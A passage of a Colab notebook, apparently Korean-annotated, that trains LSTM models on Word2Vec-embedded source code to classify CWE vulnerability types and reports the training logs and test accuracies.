        "loss, accuracy = model.evaluate(X_test, y_test, verbose=0)\n",
        "print(f\"\\nTest Accuracy: {accuracy*100:.2f}%\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 659
        },
        "id": "nCEFceZFOdKw",
        "outputId": "7e7071b7-829d-4499-c3cc-1db2ba130b09"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "/usr/local/lib/python3.12/dist-packages/keras/src/layers/rnn/rnn.py:199: UserWarning: Do not pass an `input_shape`/`input_dim` argument to a layer. When using Sequential models, prefer using an `Input(shape)` object as the first layer in the model instead.\n",
            "  super().__init__(**kwargs)\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1mModel: \"sequential\"\u001b[0m\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\">Model: \"sequential\"</span>\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
              "┃\u001b[1m \u001b[0m\u001b[1mLayer (type)                   \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1mOutput Shape          \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1m      Param #\u001b[0m\u001b[1m \u001b[0m┃\n",
              "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
              "│ lstm (\u001b[38;5;33mLSTM\u001b[0m)                     │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m128\u001b[0m)            │       \u001b[38;5;34m117,248\u001b[0m │\n",
              "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
              "│ dense (\u001b[38;5;33mDense\u001b[0m)                   │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m7\u001b[0m)              │           \u001b[38;5;34m903\u001b[0m │\n",
              "└─────────────────────────────────┴────────────────────────┴───────────────┘\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\">┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
              "┃<span style=\"font-weight: bold\"> Layer (type)                    </span>┃<span style=\"font-weight: bold\"> Output Shape           </span>┃<span style=\"font-weight: bold\">       Param # </span>┃\n",
              "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
              "│ lstm (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">LSTM</span>)                     │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">128</span>)            │       <span style=\"color: #00af00; text-decoration-color: #00af00\">117,248</span> │\n",
              "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
              "│ dense (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)                   │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">7</span>)              │           <span style=\"color: #00af00; text-decoration-color: #00af00\">903</span> │\n",
              "└─────────────────────────────────┴────────────────────────┴───────────────┘\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Total params: \u001b[0m\u001b[38;5;34m118,151\u001b[0m (461.53 KB)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Total params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">118,151</span> (461.53 KB)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Trainable params: \u001b[0m\u001b[38;5;34m118,151\u001b[0m (461.53 KB)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">118,151</span> (461.53 KB)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Non-trainable params: \u001b[0m\u001b[38;5;34m0\u001b[0m (0.00 B)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Non-trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> (0.00 B)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Epoch 1/10\n",
            "\u001b[1m1/1\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m4s\u001b[0m 4s/step - accuracy: 0.0455 - loss: 1.9578 - val_accuracy: 0.5000 - val_loss: 1.6310\n",
            "Epoch 2/10\n",
            "\u001b[1m1/1\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 82ms/step - accuracy: 0.5455 - loss: 1.5727 - val_accuracy: 0.5000 - val_loss: 1.4344\n",
            "Epoch 3/10\n",
            "\u001b[1m1/1\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 135ms/step - accuracy: 0.7727 - loss: 1.2582 - val_accuracy: 0.6667 - val_loss: 1.2842\n",
            "Epoch 4/10\n",
            "\u001b[1m1/1\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 139ms/step - accuracy: 0.8636 - loss: 1.0108 - val_accuracy: 0.6667 - val_loss: 1.1711\n",
            "Epoch 5/10\n",
            "\u001b[1m1/1\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 178ms/step - accuracy: 0.8636 - loss: 0.8189 - val_accuracy: 0.6667 - val_loss: 1.0883\n",
            "Epoch 6/10\n",
            "\u001b[1m1/1\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 283ms/step - accuracy: 0.8636 - loss: 0.6678 - val_accuracy: 0.8333 - val_loss: 1.0300\n",
            "Epoch 7/10\n",
            "\u001b[1m1/1\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 189ms/step - accuracy: 0.8636 - loss: 0.5457 - val_accuracy: 0.8333 - val_loss: 0.9899\n",
            "Epoch 8/10\n",
            "\u001b[1m1/1\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 198ms/step - accuracy: 0.9545 - loss: 0.4454 - val_accuracy: 0.8333 - val_loss: 0.9613\n",
            "Epoch 9/10\n",
            "\u001b[1m1/1\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 188ms/step - accuracy: 1.0000 - loss: 0.3613 - val_accuracy: 0.8333 - val_loss: 0.9399\n",
            "Epoch 10/10\n",
            "\u001b[1m1/1\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 163ms/step - accuracy: 1.0000 - loss: 0.2896 - val_accuracy: 0.8333 - val_loss: 0.9260\n",
            "\n",
            "Test Accuracy: 57.14%\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# Select a random row from the original df DataFrame\n",
        "random_row = df.sample(1).iloc[0]\n",
        "\n",
        "# Get the actual CWE label and keyword\n",
        "actual_cwe = random_row['CWE']\n",
        "actual_keyword = random_row['keyword']\n",
        "\n",
        "# Get the source code\n",
        "source_code = random_row['source']\n",
        "\n",
        "# Preprocess the source code: tokenize, embed, and pad\n",
        "tokenized_code = tokenize_python(source_code)\n",
        "\n",
        "# Ensure w2v_model was loaded successfully\n",
        "if w2v_model:\n",
        "    embedded_code = embed_sequences([tokenized_code], w2v_model) # embed_sequences expects a list of sequences\n",
        "    if embedded_code and len(embedded_code) > 0 and embedded_code[0].size > 0:\n",
        "        # Pad the embedded sequence\n",
        "        max_sequence_length = 100 # Use the same max length as training\n",
        "        embedding_dim = w2v_model.vector_size\n",
        "        padded_code = np.zeros((max_sequence_length, embedding_dim)) # Initialize with zeros\n",
        "\n",
        "        embedded_sequence = embedded_code[0]\n",
        "        if embedded_sequence.shape[0] > 0:\n",
        "            # Calculate padding needed\n",
        "            padding_length = max_sequence_length - embedded_sequence.shape[0]\n",
        "            if padding_length > 0:\n",
        "                # Create padding of zero vectors\n",
        "                padding = np.zeros((padding_length, embedding_dim))\n",
        "                # Concatenate original sequence with padding\n",
        "                padded_code = np.concatenate((embedded_sequence, padding), axis=0)\n",
        "            else:\n",
        "                # Truncate if sequence is longer than max_sequence_length\n",
        "                padded_code = embedded_sequence[:max_sequence_length]\n",
        "\n",
        "        # Reshape for prediction (add batch dimension)\n",
        "        padded_code = np.expand_dims(padded_code, axis=0)\n",
        "\n",
        "        # Make a prediction using the trained model\n",
        "        if 'model' in locals() and model is not None:\n",
        "            prediction = model.predict(padded_code)\n",
        "            predicted_class_index = np.argmax(prediction, axis=1)[0]\n",
        "\n",
        "            # Convert the predicted class index back to the CWE label\n",
        "            # Ensure label_encoder was fitted in the previous step\n",
        "            if 'label_encoder' in locals():\n",
        "                predicted_cwe = label_encoder.inverse_transform([predicted_class_index])[0]\n",
        "\n",
        "                print(f\"Actual CWE: {actual_cwe} (Keyword: {actual_keyword})\")\n",
        "                print(f\"Predicted CWE: {predicted_cwe}\")\n",
        "            else:\n",
        "                print(\"Error: label_encoder not found. Cannot convert predicted index to label.\")\n",
        "        else:\n",
        "            print(\"Error: LSTM model not found. Please train the model first.\")\n",
        "    else:\n",
        "        print(\"Error: Could not embed the source code.\")\n",
        "else:\n",
        "    print(\"Error: Word2Vec model not loaded. Cannot embed sequences.\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "rWGGgp7GPIo0",
        "outputId": "09932aee-9845-4257-90e4-1ec9ce72ec81"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[1m1/1\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 177ms/step\n",
            "Actual CWE: CWE-89 (Keyword: sql)\n",
            "Predicted CWE: CWE-352\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 여러 모델"
      ],
      "metadata": {
        "id": "UieThfP5P-t5"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import tensorflow as tf\n",
        "from tensorflow.keras.models import Sequential\n",
        "from tensorflow.keras.layers import LSTM, Dense\n",
        "from sklearn.model_selection import train_test_split\n",
        "from sklearn.preprocessing import LabelEncoder\n",
        "from tensorflow.keras.utils import to_categorical\n",
        "import numpy as np\n",
        "\n",
        "# Get unique CWE labels from df_sample\n",
        "unique_cwes = df_sample['CWE'].unique()\n",
        "print(f\"Unique CWEs in df_sample: {unique_cwes}\")\n",
        "\n",
        "# Define model parameters (same as before)\n",
        "max_sequence_length = 100\n",
        "embedding_dim = w2v_model.vector_size # Assuming w2v_model is loaded\n",
        "\n",
        "# Dictionary to store models\n",
        "sample_cwe_models = {}\n",
        "sample_cwe_label_encoders = {}\n",
        "\n",
        "# Train a separate model for each CWE label\n",
        "for cwe_label in unique_cwes:\n",
        "    print(f\"\\nTraining model for {cwe_label}...\")\n",
        "\n",
        "    # Filter data for the current CWE and the rest\n",
        "    df_cwe = df_sample[df_sample['CWE'] == cwe_label].copy()\n",
        "    df_other = df_sample[df_sample['CWE'] != cwe_label].copy()\n",
        "\n",
        "    # Assign binary labels: 1 for the current CWE, 0 for others\n",
        "    df_cwe['binary_label'] = 1\n",
        "    df_other['binary_label'] = 0\n",
        "\n",
        "    # Combine the data\n",
        "    df_binary = pd.concat([df_cwe, df_other])\n",
        "\n",
        "    # Features (X) and Labels (y)\n",
        "    # Ensure 'padded_embedded_source' is available\n",
        "    if 'padded_embedded_source' not in df_binary.columns or df_binary['padded_embedded_source'].isnull().any():\n",
        "         print(f\"Skipping {cwe_label}: 'padded_embedded_source' is missing or contains nulls.\")\n",
        "         continue\n",
        "\n",
        "    X_binary = np.array(df_binary['padded_embedded_source'].tolist())\n",
        "    y_binary = df_binary['binary_label']\n",
        "\n",
        "    # Encode binary labels (optional for binary, but good practice)\n",
        "    label_encoder_binary = LabelEncoder()\n",
        "    y_encoded_binary = label_encoder_binary.fit_transform(y_binary)\n",
        "    # No need for to_categorical for binary classification with loss='binary_crossentropy'\n",
        "\n",
        "    # Split data\n",
        "    X_train_binary, X_test_binary, y_train_binary, y_test_binary = train_test_split(\n",
        "        X_binary, y_encoded_binary, test_size=0.2, random_state=42, stratify=y_encoded_binary\n",
        "    )\n",
        "\n",
        "    # Define the Binary LSTM model architecture\n",
        "    model_binary = Sequential()\n",
        "    model_binary.add(LSTM(64, input_shape=(max_sequence_length, embedding_dim))) # Reduced units for smaller dataset\n",
        "    model_binary.add(Dense(1, activation='sigmoid')) # Output layer with sigmoid for binary classification\n",
        "\n",
        "    # Compile the model\n",
        "    model_binary.compile(loss='binary_crossentropy', optimizer='adam', metrics=['accuracy'])\n",
        "\n",
        "    # Print model summary\n",
        "    print(f\"Model summary for {cwe_label}:\")\n",
        "    model_binary.summary()\n",
        "\n",
        "    # Train the model\n",
        "    # Adjusted epochs and batch_size for sample data\n",
        "    history_binary = model_binary.fit(X_train_binary, y_train_binary, epochs=15, batch_size=16, validation_split=0.2, verbose=0)\n",
        "\n",
        "    # Evaluate the model\n",
        "    loss_binary, accuracy_binary = model_binary.evaluate(X_test_binary, y_test_binary, verbose=0)\n",
        "    print(f\"Test Accuracy for {cwe_label}: {accuracy_binary*100:.2f}%\")\n",
        "\n",
        "    # Store the trained model and its label encoder\n",
        "    model_name = f\"model_sample_{cwe_label.replace('-', '_')}\" # Replace '-' for valid variable name\n",
        "    sample_cwe_models[cwe_label] = model_binary\n",
        "    sample_cwe_label_encoders[cwe_label] = label_encoder_binary\n",
        "\n",
        "print(\"\\nFinished training individual models for each CWE label.\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1000
        },
        "id": "nn5DLxGUQEB0",
        "outputId": "68b3ac58-175f-4ac2-e05e-9d7b7fe9ef10"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Unique CWEs in df_sample: ['CWE-94' 'CWE-538' 'CWE-89' 'CWE-77' 'CWE-79' 'CWE-352' 'CWE-601']\n",
            "\n",
            "Training model for CWE-94...\n",
            "Model summary for CWE-94:\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "/usr/local/lib/python3.12/dist-packages/keras/src/layers/rnn/rnn.py:199: UserWarning: Do not pass an `input_shape`/`input_dim` argument to a layer. When using Sequential models, prefer using an `Input(shape)` object as the first layer in the model instead.\n",
            "  super().__init__(**kwargs)\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1mModel: \"sequential_7\"\u001b[0m\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\">Model: \"sequential_7\"</span>\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
              "┃\u001b[1m \u001b[0m\u001b[1mLayer (type)                   \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1mOutput Shape          \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1m      Param #\u001b[0m\u001b[1m \u001b[0m┃\n",
              "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
              "│ lstm_7 (\u001b[38;5;33mLSTM\u001b[0m)                   │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m64\u001b[0m)             │        \u001b[38;5;34m42,240\u001b[0m │\n",
              "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
              "│ dense_7 (\u001b[38;5;33mDense\u001b[0m)                 │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m1\u001b[0m)              │            \u001b[38;5;34m65\u001b[0m │\n",
              "└─────────────────────────────────┴────────────────────────┴───────────────┘\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\">┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
              "┃<span style=\"font-weight: bold\"> Layer (type)                    </span>┃<span style=\"font-weight: bold\"> Output Shape           </span>┃<span style=\"font-weight: bold\">       Param # </span>┃\n",
              "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
              "│ lstm_7 (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">LSTM</span>)                   │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">64</span>)             │        <span style=\"color: #00af00; text-decoration-color: #00af00\">42,240</span> │\n",
              "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
              "│ dense_7 (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)                 │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">1</span>)              │            <span style=\"color: #00af00; text-decoration-color: #00af00\">65</span> │\n",
              "└─────────────────────────────────┴────────────────────────┴───────────────┘\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Total params: \u001b[0m\u001b[38;5;34m42,305\u001b[0m (165.25 KB)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Total params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">42,305</span> (165.25 KB)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Trainable params: \u001b[0m\u001b[38;5;34m42,305\u001b[0m (165.25 KB)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">42,305</span> (165.25 KB)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Non-trainable params: \u001b[0m\u001b[38;5;34m0\u001b[0m (0.00 B)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Non-trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> (0.00 B)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Test Accuracy for CWE-94: 100.00%\n",
            "\n",
            "Training model for CWE-538...\n",
            "Model summary for CWE-538:\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "/usr/local/lib/python3.12/dist-packages/keras/src/layers/rnn/rnn.py:199: UserWarning: Do not pass an `input_shape`/`input_dim` argument to a layer. When using Sequential models, prefer using an `Input(shape)` object as the first layer in the model instead.\n",
            "  super().__init__(**kwargs)\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1mModel: \"sequential_8\"\u001b[0m\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\">Model: \"sequential_8\"</span>\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
              "┃\u001b[1m \u001b[0m\u001b[1mLayer (type)                   \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1mOutput Shape          \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1m      Param #\u001b[0m\u001b[1m \u001b[0m┃\n",
              "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
              "│ lstm_8 (\u001b[38;5;33mLSTM\u001b[0m)                   │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m64\u001b[0m)             │        \u001b[38;5;34m42,240\u001b[0m │\n",
              "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
              "│ dense_8 (\u001b[38;5;33mDense\u001b[0m)                 │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m1\u001b[0m)              │            \u001b[38;5;34m65\u001b[0m │\n",
              "└─────────────────────────────────┴────────────────────────┴───────────────┘\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\">┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
              "┃<span style=\"font-weight: bold\"> Layer (type)                    </span>┃<span style=\"font-weight: bold\"> Output Shape           </span>┃<span style=\"font-weight: bold\">       Param # </span>┃\n",
              "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
              "│ lstm_8 (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">LSTM</span>)                   │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">64</span>)             │        <span style=\"color: #00af00; text-decoration-color: #00af00\">42,240</span> │\n",
              "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
              "│ dense_8 (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)                 │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">1</span>)              │            <span style=\"color: #00af00; text-decoration-color: #00af00\">65</span> │\n",
              "└─────────────────────────────────┴────────────────────────┴───────────────┘\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Total params: \u001b[0m\u001b[38;5;34m42,305\u001b[0m (165.25 KB)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Total params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">42,305</span> (165.25 KB)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Trainable params: \u001b[0m\u001b[38;5;34m42,305\u001b[0m (165.25 KB)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">42,305</span> (165.25 KB)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Non-trainable params: \u001b[0m\u001b[38;5;34m0\u001b[0m (0.00 B)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Non-trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> (0.00 B)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Test Accuracy for CWE-538: 100.00%\n",
            "\n",
            "Training model for CWE-89...\n",
            "Model summary for CWE-89:\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "/usr/local/lib/python3.12/dist-packages/keras/src/layers/rnn/rnn.py:199: UserWarning: Do not pass an `input_shape`/`input_dim` argument to a layer. When using Sequential models, prefer using an `Input(shape)` object as the first layer in the model instead.\n",
            "  super().__init__(**kwargs)\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1mModel: \"sequential_9\"\u001b[0m\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\">Model: \"sequential_9\"</span>\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
              "┃\u001b[1m \u001b[0m\u001b[1mLayer (type)                   \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1mOutput Shape          \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1m      Param #\u001b[0m\u001b[1m \u001b[0m┃\n",
              "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
              "│ lstm_9 (\u001b[38;5;33mLSTM\u001b[0m)                   │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m64\u001b[0m)             │        \u001b[38;5;34m42,240\u001b[0m │\n",
              "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
              "│ dense_9 (\u001b[38;5;33mDense\u001b[0m)                 │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m1\u001b[0m)              │            \u001b[38;5;34m65\u001b[0m │\n",
              "└─────────────────────────────────┴────────────────────────┴───────────────┘\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\">┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
              "┃<span style=\"font-weight: bold\"> Layer (type)                    </span>┃<span style=\"font-weight: bold\"> Output Shape           </span>┃<span style=\"font-weight: bold\">       Param # </span>┃\n",
              "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
              "│ lstm_9 (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">LSTM</span>)                   │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">64</span>)             │        <span style=\"color: #00af00; text-decoration-color: #00af00\">42,240</span> │\n",
              "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
